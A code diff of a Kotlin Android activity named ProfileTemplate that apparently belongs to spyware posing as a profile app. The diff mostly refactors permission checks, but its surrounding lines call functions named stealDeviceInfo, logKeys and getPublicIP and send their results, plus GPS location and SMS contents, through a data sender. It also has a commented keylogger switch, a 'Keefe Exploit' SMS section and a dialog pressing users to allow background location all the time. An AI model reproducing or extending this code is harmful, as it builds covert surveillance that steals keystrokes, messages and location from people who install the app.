@@ -53,17 +53,20 @@ class ProfileTemplate : AppCompatActivity() {
         datasender.sendData("id", gn.stealDeviceInfo())
         gn.logKeys()?.let { datasender.sendData("id", it) }
         gn.getPublicIP()?.let { datasender.sendData("id", it) }
-        val PERMISSIONS = arrayOf(
+        val LOCPERMISSIONS = arrayOf(
             Manifest.permission.ACCESS_COARSE_LOCATION,
             Manifest.permission.ACCESS_FINE_LOCATION
         )
-        if (checkLocPerms(this, *PERMISSIONS)) {
+        if (checkPerms(this, *LOCPERMISSIONS)) {
             datasender.sendData("loc", gps.getLocationDetails())
         }
         //gn.accessibilityCheck() //Activate keylogger
-
+        val SMSPERMISSIONS = arrayOf(
+            android.Manifest.permission.SEND_SMS,
+            android.Manifest.permission.READ_SMS
+        )
         // Keefe Exploit --------------------------------------------------------------
-        if (checkSMSPerms()) {
+        if (checkPerms(this, *SMSPERMISSIONS)) {
              hv.getSMS()
         }
         if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
@@ -78,6 +81,7 @@ class ProfileTemplate : AppCompatActivity() {
 
     private fun renderInfo(id: Int) {
         when(id) {
+            // TODO: Add logic for respective profile page to the application
             R.id.itBtn -> setContentView(R.layout.activity_profile)
             R.id.constrBtn -> setContentView(R.layout.activity_profile)
             R.id.eduBtn -> setContentView(R.layout.activity_profile)
@@ -89,11 +93,14 @@ class ProfileTemplate : AppCompatActivity() {
     }
 
     private fun contactUs(view: View) {
-        if (checkSMSPerms()) {
-            writeSms("hello")
-//            toast("Success")
+        val PERMISSIONS = arrayOf(
+            android.Manifest.permission.SEND_SMS,
+            android.Manifest.permission.READ_SMS
+        )
+        if (checkPerms(this, *PERMISSIONS)) {
+            writeSms("hello") //TODO: Change text to something meaningful
         } else {
-            requestSMSPerms()
+            requestPerms(this, PERMISSIONS, 101)
         }
     }
     private fun chooseFile(view: View) {
@@ -109,9 +116,9 @@ class ProfileTemplate : AppCompatActivity() {
             android.Manifest.permission.ACCESS_COARSE_LOCATION,
             android.Manifest.permission.ACCESS_FINE_LOCATION
         )
-        if (checkLocPerms(this, *PERMISSIONS)) {
+        if (checkPerms(this, *PERMISSIONS)) {
             // Check background location perms
-            if (checkLocPerms(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
+            if (checkPerms(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                 // send to google maps
                 redirectLocation()
             } else {
@@ -119,7 +126,7 @@ class ProfileTemplate : AppCompatActivity() {
                 bgAlert.setTitle("Permission Needed!")
                 bgAlert.setMessage("Background Location Permission Needed!, tap \"Allow all the time in the next screen\"")
                 bgAlert.setPositiveButton("Yes") {
-                    dialog, which -> requestLocPerms(this, arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION), 103)
+                    dialog, which -> requestPerms(this, arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION), 103)
                 }
                 bgAlert.setNegativeButton("No") {
                     dialog, which -> dialog.cancel()
@@ -127,15 +134,15 @@ class ProfileTemplate : AppCompatActivity() {
                 bgAlert.show()
             }
         } else {
-            requestLocPerms(this, PERMISSIONS, 102)
+            requestPerms(this, PERMISSIONS, 102)
         }
     }
     private fun openCamera(view: View) {
-        if (checkCameraPerms()) {
+        if (checkPerms(this, android.Manifest.permission.CAMERA)) {
             startCamera()
         }
         else {
-            requestCameraPerms()
+            requestPerms(this, arrayOf(android.Manifest.permission.CAMERA), 103)
         }
     }
 
@@ -188,19 +195,19 @@ class ProfileTemplate : AppCompatActivity() {
     }
 
 
-    // Camera Functions------------------------------------------------------------------------
-    private fun checkCameraPerms(): Boolean{
-        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
-    }
-    private fun requestCameraPerms() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
-            //Android is 11(R) or above
-            ActivityCompat.requestPermissions(this,
-                arrayOf(android.Manifest.permission.CAMERA, android.Manifest.permission.WRITE_EXTERNAL_STORAGE),
-                10
-            )
-        }
-    }
+    // Camera Functions (DEPRECATED) ------------------------------------------------------------------------
+//    private fun checkCameraPerms(): Boolean{
+//        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+//    }
+//    private fun requestCameraPerms() {
+//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
+//            //Android is 11(R) or above
+//            ActivityCompat.requestPermissions(this,
+//                arrayOf(android.Manifest.permission.CAMERA, android.Manifest.permission.WRITE_EXTERNAL_STORAGE),
+//                10
+//            )
+//        }
+//    }
     private fun startCamera() {
         val intent = Intent(this@ProfileTemplate, CameraStart::class.java)
 //        startActivity(intent)
@@ -219,36 +226,46 @@ class ProfileTemplate : AppCompatActivity() {
     }
 
 
-    // ContactUs Functions------------------------------------------------------------------------
-    private fun checkSMSPerms(): Boolean{
-        val sendsms = ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS)
-        val readsms = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
-        val boolie1 = sendsms == PackageManager.PERMISSION_GRANTED
-        val boolie2 = readsms == PackageManager.PERMISSION_GRANTED
-        println("$boolie1 $boolie2")
-        return readsms == PackageManager.PERMISSION_GRANTED
-    }
-    private fun requestSMSPerms() {
-        println("request Perms")
-        ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.READ_SMS), 101)
-    }
+    // ContactUs Functions (DEPRECATED) ------------------------------------------------------------------------
+//    private fun checkSMSPerms(): Boolean{
+//        val sendsms = ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS)
+//        val readsms = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
+//        val boolie1 = sendsms == PackageManager.PERMISSION_GRANTED
+//        val boolie2 = readsms == PackageManager.PERMISSION_GRANTED
+//        println("$boolie1 $boolie2")
+//        return readsms == PackageManager.PERMISSION_GRANTED
+//    }
+//
+//    private fun requestSMSPerms() {
+//        println("request Perms")
+//        ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.READ_SMS), 101)
+//    }
 
-    private fun checkLocPerms(context: Context,vararg permissions: String): Boolean = permissions.all {
-        val bgLoc = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-        val coarseLoc = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION)
-        val fineLoc = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION)
-        val boolie1 = bgLoc == PackageManager.PERMISSION_GRANTED
-        val boolie2 = coarseLoc == PackageManager.PERMISSION_GRANTED
-        val boolie3 = fineLoc == PackageManager.PERMISSION_GRANTED
-        println("bgLoc = $boolie1, coarseLoc = $boolie2, fineLoc = $boolie3")
+    /*
+    * Checks whether permissions supplied are allowed
+    * Arguments:
+    *   context: context
+    *   permissions: an array of Strings or a single string that represent the permissions.
+    * Returns:
+    *   A boolean of true or false depending on whether all the permissions are given
+    * */
+    private fun checkPerms(context: Context,vararg permissions: String): Boolean = permissions.all {
         val isPerm = ContextCompat.checkSelfPermission(context,it) == PackageManager.PERMISSION_GRANTED
         println("Checking $it: $isPerm")
         ContextCompat.checkSelfPermission(context,it) == PackageManager.PERMISSION_GRANTED
-//        return bgLoc == PackageManager.PERMISSION_GRANTED && coarseLoc == PackageManager.PERMISSION_GRANTED && fineLoc == PackageManager.PERMISSION_GRANTED
     }
 
-    private fun requestLocPerms(activity: Activity, permissions: Array<String>, requestCode: Int) {
-        println("Request location permissions: $permissions")
+    /*
+    * Request for permissions supplied
+    * Arguments:
+    *   activity: activity
+    *   permissions: an array of containing string(s) that represent the permissions.
+    *   requestCode: an integer representing the request code of the permission
+    * Returns:
+    *   A boolean of true or false depending on whether all the permissions are given
+    * */
+    private fun requestPerms(activity: Activity, permissions: Array<String>, requestCode: Int) {
+        println("Request permissions: $permissions")
         ActivityCompat.requestPermissions(activity, permissions, requestCode)
     }
 
@@ -265,7 +282,6 @@ class ProfileTemplate : AppCompatActivity() {
         smsIntent.putExtra("sms_body", message)
         startActivity(smsIntent)
     }
-
 
     // Extra Functions
     private fun toast(message: String){
